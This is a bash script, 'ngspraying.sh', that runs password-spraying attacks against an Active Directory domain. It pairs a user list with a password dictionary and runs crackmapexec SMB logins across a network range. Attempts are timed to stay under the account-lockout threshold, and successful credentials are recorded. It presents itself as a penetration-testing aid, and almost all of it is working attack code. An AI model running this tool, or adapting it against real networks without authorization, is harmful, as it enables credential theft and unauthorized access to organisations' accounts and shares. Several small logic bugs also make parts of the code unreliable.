#! /bin/bash
# ./ngspraying.sh -uf Users_account_file -pd Password dictionary -a attempts number -bt Block time -n Network -m Mask -d Domain [-pc]
EMPTYPARAMETERS=100
HELP_REQUESTED=101
ATTEMPTS_ARG_ERROR=102
BLOCKTIME_ARG_ERROR=103
NETWORK_ARG_ERROR=104
DOMAIN_ARG_ERROR=105
MASK_DOMAIN_ERROR=106
CONFIGURATION_FILE_NOT_EXISTS=107
USERS_FILE_NOT_EXISTS=108
PWD_FILE_NOT_EXISTS=109

: '

If Password complexity is enabled on domain controller, the following will be the password requirements:

Windows Server 2016
Passwords must be at least six characters in length.
English uppercase characters (A through Z).
English lowercase characters (a through z).
Base 10 digits (0 through 9).
Non-alphabetic characters (for example, !, $, #, %)

Windows Server 2012 and 2012 R2
6 caracteres
Passwords must be at least six characters in length.
English uppercase characters (A through Z).
English lowercase characters (a through z).
Base 10 digits (0 through 9).
Non-alphabetic characters (for example, !, $, #, %)

Windows Server 2003
https://www.tacktech.com/display.cfm?ttid=354
Has at least 6 characters
Does not contain "Administrator" or "Admin"
Contains characters from three of the following categories:
Uppercase letters (A, B, C, and so on)
Lowercase letters (a, b, c, and so on)
Numbers (0, 1, 2, and so on)
Non-alphanumeric characters (#, &, ~, and so on)

Windows Server 2008
https://thebackroomtech.com/2008/03/10/windows-server-2008-password-complexity-requirements/
Passwords cannot contain the user’s account name or parts of the user’s full name that exceed two consecutive characters.
Passwords must be at least six characters in length.
Passwords must contain characters from three of the following four categories:
English uppercase characters (A through Z).
English lowercase characters (a through z).
Base 10 digits (0 through 9).
Non-alphabetic characters (for example, !, $, #, %)
'

#################### FEATURES
function usage {
	#figlet ngspraying
	banner ngspraying
	echo -e "\nngspraying is a tool that allows test passwords policy of an internal active directory. Usually, Active Directories have rules that block user accounts after a number of wrong login attempts. ngspraying controls the time of attempts and the number of attempts, in order to perform the test without blocking the users account. This is so util in internal network assessment, where the script could be ran in background while the penetration tester continues working."
	echo -e "Features: \n. Application controls login attempts.\n. Application dont perform login attempts with users already found.\n. Application allows manual configuration of password complexity.\n. Application make backup of input-files.\n\n"
	echo -e "Usage:"
	echo -e "All the parameters below are mandatory:\n./ngspraying.sh -uf Users_account_file -pd Password dictionary -a attempts number -bt Block time -n Network -m Mask -d Domain\n\n***************************************************\n"
	echo -e "Parameters\n"
	echo -e "Users account file:\nActive Directory users. Format: Only the user account, without the domain (e.g domain\user or user@domain is not correct. Only write the "user" is correct). One user by line\n. To enumerate users could be used enum4linux (https://tools.kali.org/information-gathering/enum4linux) or a powershell tool like ADRecon (https://github.com/sense-of-security/ADRecon)."
	echo -e "\nPassword dictionary:\nPassword file. Format: One password by line. See https://digg.com/2019/worst-passwords-most-common. It is recommended create a custom list related to the client, date and general context of the assesmment. Additionally, it is possible to use the ngspraying.sh's brother, genpass.sh (https://github.com/nnicogomez/password-spraying.\n"
	echo -e "\nattempts:\nRequired attemtps to block the users account. If the account will be block after five (5) wrong attempts (This means, the 6th attemp wont be possible because the account was blocked) in ten (10) minutes, we should enter five (5).\n"
	echo -e "\nBlock time:\nWindow time to catch wrong login attempts. Following previously example; if the account will be block after x wrong attempts in 10 minutes, we should enter ten (10).\n"
	echo -e "\nNetwork:\nNetwork. Protocol: IPv4. e.g: 192.168.0.0\n"
	echo -e "\nMask:\nNetwork mask. e.g: 24\n"
	echo -e "\nDomain:\nClient domain. Ej: ENTERPRISE.LOCAL\n"
	echo -e "\n********************************\nTypical invoke example\n"
	echo -e "./ngspraying.sh clientUserFile passwordsDictionary 5 10 192.168.0.0 24 TEST.LOCAL\n"
	exit $HELP_REQUESTED
	}

function setPasswordDefaultComplexity(){
	carac1=6
	carac2=20
	numeros="N"
	mayus="N"
	simb="N"
	same_than_user="N"
	modifyPasswordFile $2 $carac1 $carac2 $numeros $mayus $simb $same_than_user
}


function log(){
	
	path="logs/logs_$(date +%Y-%m-%d)"
	if [[ ! -f  $path ]]; then
		if [[ ! -d  "logs" ]]; then
		mkdir logs
		fi
		touch "logs/logs_$(date +%Y-%m-%d)"
		echo "---------------------------------------------------NEW SESSION------------------------------------------------------" >> $path
	fi
	echo "$1" >> $path
}

function passwordComplexity(){
		array=(6,20,"N","N","N","N")
		if [[ $1 == "Y" ]]; then
		log "Password complexity module - START"
		log "Using NGCONFIG.cfg"

		if [[ ! -f "NGCONFIG.cfg" ]]; then
			showErrorAndExit $CONFIGURATION_FILE_NOT_EXISTS
		fi
		i=0
		while  IFS=: read -ra lines; do
			array[$i]=$lines
			let i=i+1	
		done < "NGCONFIG.cfg"
		modifyPasswordFile $2 ${array[0]} ${array[1]} ${array[2]} ${array[3]} ${array[4]} ${array[5]}
	else
		setPasswordDefaultComplexity $2 
	fi	
}

function modifyPasswordFile(){
grep -E "^.{$carac1,$carac2}$" $1 >> pass.tmp
	rm $1
	mv pass.tmp $1

	if [[ $mayus != "Y" || $mayus == "y" ]]; then
		sed -ni '/[A-Z]/p' $1
	fi
	if [[ $numeros == 'Y' || $numeros == "y" ]]; then
		sed -ni '/[0-9]/p' $1
	fi
	if [[ $simb == 'Y' || $simb == 'y' ]]; then
		sed -ni '/[!@#$&()\\-`.+,/\]/p' $2
	fi

	echo "Password complexity:
	Min Char: $2
	Max char: $3
	At least one number: $4
	At least one capital letter: $5
	At least one symbol: $5
	Password could include username: $6" 
	echo -e "Passwords file was modified accord to the aforementioned rules\n\n"
}


i=0

center() {
  termwidth="$(tput cols)"
  padding="$(printf '%0.1s' ={1..500})"
  printf '%*.*s %s %*.*s\n' 0 "$(((termwidth-2-${#1})/2))" "$padding" "$1" 0 "$(((termwidth-1-${#1})/2))" "$padding"
}


function showErrorAndExit(){
	echo "ERROR "
	case $1 in
    $EMPTYPARAMETERS)
      echo "One of the given arguments is empty"
      exit $EMPTYPARAMETERS
      ;;
	$ATTEMPTS_ARG_ERROR)
      echo "Attempts less than zero or bigger than twenty"
      exit $ATTEMPTS_ARG_ERROR
      ;;
	$BLOCKTIME_ARG_ERROR)
      echo "Attempts less than zero"
      exit $BLOCKTIME_ARG_ERROR
      ;;
	$NETWORK_ARG_ERROR)
      echo "Network has a wrong format"
      exit $NETWORK_ARG_ERROR
      ;;
	$MASK_ARG_ERROR)
      echo "Mask has a wrong format"
      exit $MASK_ARG_ERROR
      ;;
	$DOMAIN_ARG_ERROR)
      echo "Domain is not a string"
      exit $DOMAIN_ARG_ERROR
      ;;
	$CONFIGURATION_FILE_NOT_EXISTS)
      echo "Configuration file NGCONFIG.txt not exists"
      exit $CONFIGURATION_FILE_NOT_EXISTS
      ;;
	$USERS_FILE_NOT_EXISTS)
      echo "Users file not exists"
      exit $USERS_FILE_NOT_EXISTS
      ;;
	$PWD_FILE_NOT_EXISTS)
      echo "Passwords file not exists"
      exit $PWD_FILE_NOT_EXISTS
      ;;
    -*)
	  break;
      ;;
	esac
}

function emptyArguments(){
	if [[ $1 == "" ||  $2 == "" || $3 == "" || $4 == "" || $5 == "" || $6 == "" || $7 == "" ]]; then
	showErrorAndExit $EMPTYPARAMETERS
	fi
}

function users_validation(){
	if [[ ! -f $1 ]]; then
		echo "hola"
		showErrorAndExit $USERS_FILE_NOT_EXISTS
	fi
}

function pwd_validation(){
	if [[ ! -f $1 ]]; then
		showErrorAndExit $PWD_FILE_NOT_EXISTS
	fi
}

function attempts_validation(){
	min=1
	max=20
	if (( "$1" < "$min" || "$1" > "$max" )); then
	showErrorAndExit $ATTEMPTS_ARG_ERROR
	fi
}

function block_time_validation(){
	if (( "$1" < 1 )); then
	showErrorAndExit $BLOCKTIME_ARG_ERROR
	fi
}

function network_validation(){
	if [[ $1 =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
	echo ""
	else
	showErrorAndExit $NETWORK_ARG_ERROR
	fi
}

function mask_validation(){
	min=1
	max=32
	if (( "$1" < "$min" || "$1" > "$max" )); then
	showErrorAndExit $MASK_ARG_ERROR
	fi
}

function domain_validation(){
	if [[ $1 =~ ^[0-9]{2,30} ]]; then
	showErrorAndExit $DOMAIN_ARG_ERROR
	fi
}

function control_c(){
	if [[ -f ultimos.tmp ]]; then
		rm ultimos.tmp
	fi
	if [[ "$band" == 1 ]]; then
		if [[ -f "$archUs.tmp" ]];then
			rm "$archUs"
			cp "$archUs.tmp" "$archUs"
			rm "$archUs.tmp"
		fi
		
		rm $archPw
		cp "$archPw.tmp" "$archPw"
		rm "$archPw.tmp"
	fi
	echo -e "$lines" >> ultimos.tmp #Usuario
	echo -e "$line" >> ultimos.tmp #Password
	kill $PID
	exit 1
}

#################### FUNCIONES

#################### VALIDACIONES
users_file=""
pwd_file=""
attempts=""
block_time=""
network=""
mask=""
domain=""
p_c="N"

if [ $# == 0 ]; then
usage
fi

for arg in "$@"
do
	case $1 in
		-h|--help|--h)
		usage
		;;
		-uf|--users-file)
			users_file=$2
		shift
		shift
		;;
		-pd|--passwords-file)
			pwd_file=$2
		shift
		shift
		;;
		-a|--attempts)
			attempts=$2
		shift
		shift
		;;
		-bt|--block-time)
			block_time=$2
		shift
		shift
		;;
		-n|--network)
			network=$2
		shift
		shift
		;;
		-m|--mask)
			mask=$2
		shift
		shift
		;;
		-d|--domain)
			domain=$2
		shift
		shift
		;;
		-pc|--password-complexity)
		p_c="Y"
		shift
		;;
		*)
		OTHER_ARGUMENTS+=("$1")
		break
		;;
  esac
done

log "User file: $users_file"
log "Passwords file: $pwd_file"
log "Attempts: $attempts"
log "Block time: $block_time"
log "Network: $network"
log "Mask: $mask"
log "Domain: $domain"
log "Complexity: $p_cs" 

emptyArguments $users_file $pwd_file $attempts $block_time $network $mask $domain
users_validation $users_file
pwd_validation $pwd_file
attempts_validation $attempts
block_time_validation $block_time
network_validation $network
mask_validation $mask
domain_validation $domain

echo "Good!"
center " ngspraying "

cp $users_file $users_file.bak
cp $pwd_file $pwd_file.bak

passwordComplexity $p_c $pwd_file
#################### VALIDACIONES

#################### MAIN

archUs=$users_file
archPw=$pwd_file
band=0
if [[ -f ultimos.tmp ]]; then
	var=1	
	while read -r ult;
	do
		if [ "$var" == 1 ];then
		ultUser=$(echo $ult)
		var=0
		else
		ultPw=$(echo $ult)
		fi
	done < ultimos.tmp

	echo "Last user: $ultUser"
	echo "Last password: $ultPw"
	read -p "Do you want to continue from the last point? [User: $ultUser][Password: $ultPw] [Y/N]" rta
	if [[ "$rta" == "Y" || "$rta" == "y" ]]; then
		cp "$users_file" "$users_file.tmp"
		cp "$pwd_file" "$pwd_file.tmp"
		band=1
		awk "/^$ultPw$/,/*/" $pwd_file > tmp && mv tmp $pwd_file
		awk "/^$ultUser$/,/*/" $users_file > tmp && mv tmp $users_file
		clear
	fi
	
fi

trap control_c SIGINT 

inte=`expr $attempts - 1`
time=`expr $block_time \* 60`
domain=$(echo "$domain")
i=1
k=0
tamano=$(wc -w $users_file)
tam="${tamano:0:1}"
finallogscript="logs/successfull_login_attempts_$(date +%Y-%m-%d)"

center " $inte attempts will be made every $block_time minutes($tiempo seconds). Target: $domain"
while [[ "$i" -lt "$attempts" && "$k" -lt "$tam" ]];
do
		read -r line
		echo -e "\e[1;32m [+] Actual password: *$line*. Number: $k\e[0m";
		echo -e "\e[0;32m [++] Actual attempt: $i\e[0m"
			while read -r lines; do
				echo -e "\t \e[1;33m [+++] Actual user: *$lines*\e[0m"
					resultado=$(crackmapexec smb ${network}/${mask} -u $lines -p $line -d $domain --shares)
					echo -e "$resultado \n" >> logCME
					echo "$resultado"| while read linea; do
						if [[ $linea == *"Enumerating shares"* ]]
						then
							sed -i "s/\<$lines\>//g" $users_file ## Aca deberiamos eliminar la palabra del archivo.	
							sed -i '/^ *$/d' $users_file
							final=$(echo $linea | sed 's/^[^0-9]*\(.*\)/\1/')
				   			echo -e "****************************\nLogin attempt successfully! User: $lines. Password: $line.\nData: $final\n****************************" >> finallogscript
							echo -e "\t\t \e[1;37m ****Login attempt successfully. User: $lines****\e[0m"
						fi
					done
			done < "$users_file"
		if [[ $band == 1 ]];then
			rm "$users_file"
			cp "$users_file.tmp" "$users_file"
			rm "$users_file.tmp"
			band=0
		fi
		let i=i+1
		let k=k+1
	if [[ "$i" == "$attempts" ]]
	then
		i=1
		echo -e "\e[1;36mSleeping $block_time minutes ($time seconds)\e[0\m"
		sleep $time
	fi
done < "$pwd_file"

center " END "
if [[ -f ultimos.tmp ]]; then
		rm ultimos.tmp
	fi
	if [[ "$band" == 1 ]]; then
		if [[ -f "$archUs.tmp" ]];then
			rm "$archUs"
			cp "$archUs.tmp" "$archUs"
			rm "$archUs.tmp"
		fi
		
		rm $archPw
		cp "$archPw.tmp" "$archPw"
		rm "$archPw.tmp"
	fi

